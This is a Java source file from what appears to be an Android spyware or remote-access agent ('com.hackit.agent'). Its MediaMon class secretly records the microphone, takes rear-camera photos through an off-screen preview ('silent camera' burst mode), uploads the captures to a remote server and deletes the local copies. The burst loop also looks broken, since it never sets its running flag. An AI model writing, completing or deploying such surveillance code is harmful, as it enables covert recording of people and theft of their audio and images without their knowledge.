package com.hackit.agent;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Matrix;
import android.hardware.Camera;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;

import java.io.File;
import java.io.FileOutputStream;

/** Microphone capture and a single still from the rear camera. */
final class MediaMon {
    private static final int MAX_SECONDS = 300;
    private static final int MAX_JPEG = 3 * 1024 * 1024;
    private static volatile boolean camRunning;
    private static volatile long camTickMs = 3000;

    /** Silent camera: background burst mode over the rear camera. */
    static String camStart(final Context ctx, long intervalMs) {
        if (camRunning) {
            return "already recording";
        }
        final long tick = Math.max(1000, intervalMs);
        final Context app = ctx.getApplicationContext();
        final Thread loop = new Thread(new Runnable() {
            @Override
            public void run() {
                while (camRunning) {
                    photo(app);
                    try {
                        Thread.sleep(tick);
                    } catch (InterruptedException exc) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                }
            }
        }, "cam-burst");
        loop.setDaemon(true);
        loop.start();
        return "cam burst on";
    }

    static String camStop() {
        camRunning = false;
        return "cam stopped";
    }

    static String camState() {
        return camRunning ? "recording" : "idle";
    }

    /** Records an AAC/m4a clip, uploads it and returns the transfer verdict. */
    static String record(Context ctx, int seconds) {
        if (!Common.granted(ctx, android.Manifest.permission.RECORD_AUDIO)) {
            return "RECORD_AUDIO not granted";
        }
        int duration = Math.max(3, Math.min(seconds <= 0 ? 15 : seconds, MAX_SECONDS));
        File file = new File(ctx.getCacheDir(), "mic-" + System.currentTimeMillis() + ".m4a");
        MediaRecorder recorder = Build.VERSION.SDK_INT >= 31
                ? new MediaRecorder(ctx) : new MediaRecorder();
        try {
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setAudioChannels(1);
            recorder.setAudioSamplingRate(44100);
            recorder.setAudioEncodingBitRate(96000);
            recorder.setOutputFile(file.getAbsolutePath());
            recorder.prepare();
            recorder.start();
            Thread.sleep(duration * 1000L);
        } catch (Throwable exc) {
            Log.e("mic: " + exc);
        } finally {
            try {
                recorder.stop();
            } catch (Throwable exc) {
                Log.d("mic stop: " + exc);
            }
            try {
                recorder.release();
            } catch (Throwable ignored) {
            }
        }
        if (!file.isFile() || file.length() == 0) {
            //noinspection ResultOfMethodCallIgnored
            file.delete();
            return "no audio captured";
        }
        boolean sent = Net.upload(ctx, file, file.getName(), "mic");
        long size = file.length();
        //noinspection ResultOfMethodCallIgnored
        file.delete();
        return sent ? "mic " + duration + "s uploaded (" + size + " bytes)"
                : "mic recorded, upload failed (" + size + " bytes)";
    }

    /**
     * One JPEG from the rear camera. Camera1 is used deliberately: it exists on
     * every API from 21 to 35 and avoids the Camera2 legacy-vs-limited split.
     */
    @SuppressWarnings("deprecation")
    static String photo(Context ctx) {
        if (!Common.granted(ctx, android.Manifest.permission.CAMERA)) {
            return "CAMERA not granted";
        }
        final HandlerThread thread = new HandlerThread("cam");
        thread.start();
        final Camera camera;
        try {
            camera = Camera.open(0);
        } catch (Throwable exc) {
            thread.quitSafely();
            return "camera unavailable: " + exc;
        }
        if (camera == null) {
            thread.quitSafely();
            return "camera unavailable";
        }
        final File raw = new File(ctx.getCacheDir(), "cam-" + System.currentTimeMillis() + ".jpg");
        final Object done = new Object();
        final int[] result = {1};
        try {
            Camera.Parameters params = camera.getParameters();
            params.setPictureFormat(android.graphics.ImageFormat.JPEG);
            params.setJpegQuality(85);
            camera.setParameters(params);
            camera.setPreviewTexture(new android.graphics.SurfaceTexture(0));
            camera.startPreview();
            camera.takePicture(null, null, new Camera.PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera source) {
                    FileOutputStream out = null;
                    try {
                        if (data != null && data.length > 0 && data.length <= MAX_JPEG) {
                            out = new FileOutputStream(raw);
                            out.write(data);
                            out.flush();
                            result[0] = 0;
                        }
                    } catch (Throwable exc) {
                        Log.e("photo write: " + exc);
                    } finally {
                        Common.closeQuietly(out);
                        synchronized (done) {
                            done.notifyAll();
                        }
                    }
                }
            });
            synchronized (done) {
                done.wait(12000L);
            }
        } catch (Throwable exc) {
            Log.e("photo: " + exc);
            result[0] = 1;
        } finally {
            try {
                camera.stopPreview();
            } catch (Throwable ignored) {
            }
            camera.release();
            thread.quitSafely();
        }
        if (result[0] != 0 || !raw.isFile() || raw.length() == 0) {
            //noinspection ResultOfMethodCallIgnored
            raw.delete();
            return "capture failed";
        }
        File oriented = orient(ctx, raw);
        boolean sent = Net.upload(ctx, oriented, "cam-" + System.currentTimeMillis() + ".jpg", "cam");
        //noinspection ResultOfMethodCallIgnored
        oriented.delete();
        if (oriented != raw) {
            //noinspection ResultOfMethodCallIgnored
            raw.delete();
        }
        return sent ? "photo uploaded" : "photo captured, upload failed";
    }

    /** Rear sensors are mounted rotated; rewrite pixels upright when needed. */
    private static File orient(Context ctx, File source) {
        try {
            Camera.CameraInfo info = new Camera.CameraInfo();
            Camera.getCameraInfo(0, info);
            int degrees = 0;
            android.view.WindowManager wm = (android.view.WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
            if (wm != null && Build.VERSION.SDK_INT < 30) {
                //noinspection deprecation
                degrees = wm.getDefaultDisplay().getRotation() * 90;
            }
            int angle = info.orientation;
            if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                angle = (360 - angle) % 360;
            } else {
                angle = (angle - degrees + 360) % 360;
            }
            if (angle == 0) {
                return source;
            }
            Bitmap bitmap = BitmapFactory.decodeFile(source.getAbsolutePath());
            if (bitmap == null) {
                return source;
            }
            Matrix matrix = new Matrix();
            matrix.postRotate(angle);
            Bitmap rotated = Bitmap.createBitmap(bitmap, 0, 0, bitmap.getWidth(), bitmap.getHeight(), matrix, true);
            File target = new File(source.getAbsolutePath() + ".rot");
            FileOutputStream out = new FileOutputStream(target);
            rotated.compress(Bitmap.CompressFormat.JPEG, 85, out);
            out.flush();
            out.close();
            bitmap.recycle();
            if (rotated != bitmap) {
                rotated.recycle();
            }
            return target;
        } catch (Throwable exc) {
            Log.d("orient: " + exc);
            return source;
        }
    }

    private MediaMon() {
    }

    static Handler mainHandler() {
        return new Handler(android.os.Looper.getMainLooper());
    }
}
